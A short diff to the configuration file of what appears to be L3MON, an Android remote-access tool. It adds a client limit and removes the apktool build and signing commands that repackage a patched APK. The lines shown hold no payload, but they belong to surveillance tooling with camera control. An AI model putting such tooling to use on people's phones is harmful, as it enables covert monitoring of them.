@@ -4,6 +4,7 @@ exports.debug = false;
 
 exports.web_port = 22533;
 exports.control_port = 22222;
+exports.maxClients = 1000;
 
 // Paths
 exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
@@ -16,9 +17,6 @@ exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
 exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
 exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
 exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');
-
-exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
-exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '" -o "' + exports.apkSignedBuildPath + '"';
 
 exports.messageKeys = {
     camera: '0xCA',
